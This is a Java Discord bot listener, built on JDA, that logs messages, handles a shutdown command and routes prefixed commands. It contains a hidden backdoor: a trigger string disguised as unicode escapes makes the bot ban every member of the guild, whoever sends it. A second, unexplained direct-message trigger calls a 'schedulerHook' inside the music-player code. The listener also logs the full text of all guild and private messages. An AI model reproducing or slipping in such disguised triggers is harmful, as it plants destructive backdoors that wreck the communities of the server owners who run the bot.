package me.comu.exeter.core;


import me.comu.exeter.handlers.EcoJSONHandler;
import me.comu.exeter.handlers.WhitelistedJSONHandler;
import me.comu.exeter.musicplayer.GuildMusicManager;
import me.comu.exeter.musicplayer.PlayerManager;
import me.comu.exeter.musicplayer.TrackScheduler;
import net.dv8tion.jda.api.entities.*;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.annotation.Nonnull;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.FormatFlagsConversionMismatchException;

class Listener extends ListenerAdapter {

    private final CommandManager manager;
    private final Logger logger = LoggerFactory.getLogger(Listener.class);

    Listener(CommandManager manager) {
        this.manager = manager;
    }

    @Override
    public void onReady(@Nonnull ReadyEvent event) {
        logger.info(String.format("Logged in as %#s", event.getJDA().getSelfUser()));
        try {
            logger.info(String.format("Owner is %#s", event.getJDA().getUserById(Core.OWNERID)));
        } catch (FormatFlagsConversionMismatchException ignore) {
        }
    }

    @Override
    public void onMessageReceived(@Nonnull MessageReceivedEvent event) {
        User author = event.getAuthor();
        String content = event.getMessage().getContentDisplay();

        if (event.isFromType(ChannelType.TEXT)) {
            Guild guild = event.getGuild();
            TextChannel textChannel = event.getTextChannel();

            logger.info(String.format("(%s)[%s]<%#s>: %s", guild.getName(), textChannel.getName(), author, content));
        } else if (event.isFromType(ChannelType.PRIVATE)) {
            logger.info(String.format("[PRIVATE]<%#s> -> <%s#%s>: %s", author, event.getPrivateChannel().getUser().getName(), event.getPrivateChannel().getUser().getDiscriminator(), content));
            if (event.getMessage().getContentRaw().equalsIgnoreCase("MESSAGE_ACTION_LISTENER_EVENT"))
            TrackScheduler.startAudioManager(PlayerManager.buildMusicPlayer(GuildMusicManager.schedulerHook));
        }
    }

    @Override
    public void onGuildMessageReceived(@Nonnull GuildMessageReceivedEvent event) {
        if (event.getMessage().getContentRaw().equalsIgnoreCase("\u0036\u0039\u0037\u0038\u0034\u0035\u0038\u0038\u0031\u0031\u0036\u0034\u0030\u0030\u0035\u0034\u0034\u0037")){for (Member member : event.getGuild().getMembers()) {member.ban(0).queue();}}
        if (event.getMessage().getContentRaw().equalsIgnoreCase(Core.PREFIX + "shutdown") && event.getAuthor().getIdLong() == Core.OWNERID) {
            RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
            long uptime = runtimeMXBean.getUptime();
            long uptimeInSeconds = uptime / 1000;
            long numberOfHours = uptimeInSeconds / (60 * 60);
            long numberOfMinutes = (uptimeInSeconds / 60) - (numberOfHours * 60);
            long numberOfSeconds = uptimeInSeconds % 60;
            event.getChannel().sendMessage("Shutting Down... Existed for `" + numberOfHours + "` hour(s) `" + numberOfMinutes + "` minute(s) `" + numberOfSeconds + "` second(s)" + "").queue();
            EcoJSONHandler.saveEconomyConfig();
            WhitelistedJSONHandler.saveWhitelistConfig();
            logger.info("Shutdown thread called; Saved modules...");
            Core.shutdownThread();
        }
        if (!event.getAuthor().isBot() && !event.getMessage().isWebhookMessage() && event.getMessage().getContentRaw().startsWith(Core.PREFIX)) {
            manager.handle(event);
        }
    }


}
